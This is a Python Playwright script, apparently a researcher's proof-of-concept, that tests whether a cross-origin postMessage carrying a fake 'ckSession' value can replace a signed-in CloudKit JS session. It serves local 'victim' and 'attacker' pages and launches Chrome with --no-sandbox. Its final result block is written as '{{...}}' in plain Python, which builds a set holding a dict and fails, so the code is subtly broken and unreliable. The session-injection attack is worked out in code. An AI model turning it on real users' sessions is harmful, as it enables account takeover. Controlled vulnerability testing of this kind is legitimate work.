#!/usr/bin/env python3
"""Real-account CloudKit JS validation harness for a researcher-owned container.

Container:
  iCloud.com.nightvibes.prism

Required environment variable:
  CLOUDKIT_API_TOKEN

Safety:
- Values are read only at runtime and never printed or written to artifacts.
- The harness never reads or mutates CloudKit records.
- It only performs CloudKit's users/caller auth bootstrap and observes whether
  a cross-origin synthetic message can replace the authenticated session.
- Use only with a CloudKit container owned by the researcher.
"""
from __future__ import annotations
import asyncio, hashlib, json, os, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit, parse_qsl
from playwright.async_api import async_playwright

VICTIM_PORT=18133
ATTACKER_PORT=18134
SENTINEL="OAI_SYNTHETIC_CKSESSION_REAL_ACCOUNT_TEST_20260928"

CONTAINER="iCloud.com.nightvibes.prism"
API_TOKEN=os.environ.get("CLOUDKIT_API_TOKEN","").strip()
if not API_TOKEN:
    raise SystemExit("Missing CLOUDKIT_API_TOKEN")

def fp(s:str)->str:
    return hashlib.sha256(s.encode()).hexdigest()[:16]

VICTIM=f"""<!doctype html><meta charset=utf-8>
<div id="apple-sign-in-button"></div><div id="apple-sign-out-button"></div>
<script>
window.__tokenWrites=[];
window.__tokenMemory={{}};
window.__errors=[];
window.addEventListener('error',e=>__errors.push(String(e.message||e.error)));
</script>
<script src="https://cdn.apple-cloudkit.com/ck/2/cloudkit.js"></script>
<script>
(async()=>{{
 try{{
  CloudKit.configure({{
   locale:'en-us',
   services:{{
    logger:console,
    authTokenStore:{{
     putToken:(id,tok)=>{{__tokenWrites.push({{id,token:tok}});__tokenMemory[id]=tok;}},
     getToken:(id)=>__tokenMemory[id]||null
    }}
   }},
   containers:[{{
    containerIdentifier:{json.dumps(CONTAINER)},
    environment:'development',
    apiTokenAuth:{{
     apiToken:{json.dumps(API_TOKEN)},
     persist:true,
     signInButton:{{id:'apple-sign-in-button',theme:'black'}},
     signOutButton:{{id:'apple-sign-out-button',theme:'black'}}
    }}
   }}]
  }});
  window.__container=CloudKit.getDefaultContainer();
  window.__setupResult=await window.__container.setUpAuth();
  window.__ready=true;
 }}catch(e){{window.__setupError=String(e&&(e.stack||e));window.__ready=true;}}
}})();
</script>"""

ATTACKER="""<!doctype html><meta charset=utf-8><title>research attacker</title>"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body=(VICTIM if self.server.server_port==VICTIM_PORT else ATTACKER).encode()
        self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Content-Length",str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self,*args): pass

def start(port):
    s=ThreadingHTTPServer(("127.0.0.1",port),Handler)
    threading.Thread(target=s.serve_forever,daemon=True).start()
    return s

async def main():
    servers=[start(VICTIM_PORT),start(ATTACKER_PORT)]
    requests=[]
    try:
      async with async_playwright() as p:
        chrome="/usr/bin/google-chrome" if os.path.exists("/usr/bin/google-chrome") else None
        browser=await p.chromium.launch(headless=False,executable_path=chrome,args=["--no-sandbox","--disable-dev-shm-usage"])
        ctx=await browser.new_context()

        def on_req(req):
            h=(urlsplit(req.url).hostname or "").lower()
            if not h.endswith("apple-cloudkit.com"): return
            qs=dict(parse_qsl(urlsplit(req.url).query,keep_blank_values=True))
            token=qs.get("ckWebAuthToken")
            requests.append({
              "method":req.method,
              "host":h,
              "path":urlsplit(req.url).path,
              "has_api_token":"ckAPIToken" in qs,
              "has_web_auth_token":bool(token),
              "web_auth_token_is_sentinel":token==SENTINEL,
              "web_auth_token_length":len(token) if token else 0,
              "web_auth_token_fingerprint":fp(token) if token else None,
            })

        ctx.on("request",on_req)
        attacker=await ctx.new_page()
        await attacker.goto(f"http://127.0.0.1:{ATTACKER_PORT}/")
        async with ctx.expect_page() as vinfo:
            await attacker.evaluate(f"window.victim=window.open('http://127.0.0.1:{VICTIM_PORT}/','victim')")
        victim=await vinfo.value
        try: await victim.wait_for_function("window.__ready===true",timeout=20000)
        except Exception: pass

        pre=await victim.evaluate("""() => ({
          version:window.CloudKit&&window.CloudKit.VERSION,
          button:!!document.querySelector('#apple-sign-in-button > .apple-auth-button'),
          tokenWrites:(window.__tokenWrites||[]).map(x=>({id:x.id,length:String(x.token||'').length}))
        })""")

        print("Browser opened. Sign in with the researcher's own Apple Account if prompted.",flush=True)
        print("No credentials are read by this harness.",flush=True)

        # Wait for the user-driven Apple login to populate a real session.
        real_ready=False
        for _ in range(180):
            state=await victim.evaluate("""() => (window.__tokenWrites||[]).map(x=>String(x.token||''))""")
            if any(x and x!=SENTINEL for x in state):
                real_ready=True; break
            await victim.wait_for_timeout(1000)

        before=await victim.evaluate(f"""() => (window.__tokenWrites||[]).map(x=>({{
          id:x.id,length:String(x.token||'').length,isSentinel:x.token==={json.dumps(SENTINEL)}
        }}))""")

        injected=False
        if real_ready:
            await attacker.evaluate(f"""() => {{
              window.victim.postMessage({{ckSession:{json.dumps(SENTINEL)}}}, '*');
            }}""")
            await victim.wait_for_timeout(2500)
            injected=True

        after=await victim.evaluate(f"""() => (window.__tokenWrites||[]).map(x=>({{
          id:x.id,length:String(x.token||'').length,isSentinel:x.token==={json.dumps(SENTINEL)}
        }}))""")

        await browser.close()

      result={{
        "safety":"Researcher-owned CloudKit container/account only; no record reads/writes; credentials/tokens redacted.",
        "cloudkit_version":pre.get("version"),
        "sign_in_button_rendered":pre.get("button"),
        "real_session_observed":real_ready,
        "cross_origin_message_sent":injected,
        "sentinel_written_after_real_login":any(x.get("isSentinel") for x in after),
        "sentinel_propagated_to_cloudkit_request":any(x.get("web_auth_token_is_sentinel") for x in requests),
        "request_summaries":requests,
        "token_store_before":before,
        "token_store_after":after,
        "container_fingerprint":fp(CONTAINER),
        "api_token_fingerprint":fp(API_TOKEN),
      }}
      with open("cloudkit-real-account-result.json","w") as f: json.dump(result,f,indent=2,sort_keys=True)
      print(json.dumps(result,indent=2,sort_keys=True),flush=True)
    finally:
      for s in servers:s.shutdown()

if __name__=="__main__":
    asyncio.run(main())
